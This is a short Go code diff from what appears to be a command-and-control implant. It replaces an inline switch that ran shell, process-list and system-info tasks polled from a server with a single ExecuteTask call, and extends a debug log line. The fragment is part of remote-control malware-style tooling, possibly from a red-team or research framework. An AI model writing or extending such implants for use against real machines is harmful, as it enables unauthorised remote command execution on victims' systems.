@@ -442,23 +442,11 @@ func (i *Implant) StartPolling() error {
 		// Execute each task
 		for _, task := range resp.Tasks {
 			if DebugMode {
-				log.Printf("Executing task: %s", task.Command)
+				log.Printf("Executing task: %s (type: %v)", task.Command, task.Type)
 			}
 
-			var output []byte
-			var execErr error
-
-			// Execute based on task type
-			switch task.Type {
-			case pb.CommandMessage_SHELL:
-				output, execErr = i.ExecuteShell(task.Command, task.Args)
-			case pb.CommandMessage_PROCESS_LIST:
-				output, execErr = i.GetProcessList()
-			case pb.CommandMessage_INFO:
-				output, execErr = i.GetSystemInfo()
-			default:
-				execErr = fmt.Errorf("unsupported task type: %v", task.Type)
-			}
+			// Use the unified ExecuteTask function
+			output, execErr := i.ExecuteTask(task)
 
 			// Submit result
 			result := &pb.TaskResult{
